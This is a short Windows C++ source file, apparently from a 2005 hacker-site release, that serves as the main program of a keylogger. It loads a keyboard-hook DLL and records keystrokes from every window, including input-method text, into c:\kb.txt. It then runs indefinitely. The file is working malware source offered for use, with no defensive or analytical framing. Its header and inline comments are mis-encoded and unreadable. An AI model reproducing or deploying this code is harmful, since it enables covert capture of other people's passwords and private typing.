/*======================================
// ���̹��� 
// �����������[F.S.T]
// http://www.wrsky.com
// 2005/9/25
=======================================*/
#include "stdafx.h"
#include "keyboardhook.h"
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{ 
   
    KeyBoardHook kbh;
    char dll_path[MAX_PATH];
    ::GetModuleFileName(NULL,dll_path,sizeof(dll_path));
    char *pos=strrchr(dll_path,'\\');
    if(pos==NULL) return 0;
    strcpy(pos,"\\\0\0");
    strcat(dll_path,"hookdll.dll");
    strcpy(kbh.KBINFO.Dll_path,dll_path);
    strcpy(kbh.KBINFO.Key,"*");//*�ż�¼���еĴ��ڼ�����Ϣ���������Զ��ż������ؼ���:"����,Զ��"
    kbh.KBINFO.MaxDataLen=1;
    kbh.SetKBHookType(3);      //1:ԭʼ���̹��ӣ�2:֧�����뷨����Ϣ����,���Խػ����ģ�3:ԭʼ���Ӽ����뷨�����Ĺ���
    strcpy(kbh.KBINFO.Savepath,"c:\\kb.txt");
    kbh.Start();
    while(true) Sleep(1000);
	return 0;
}



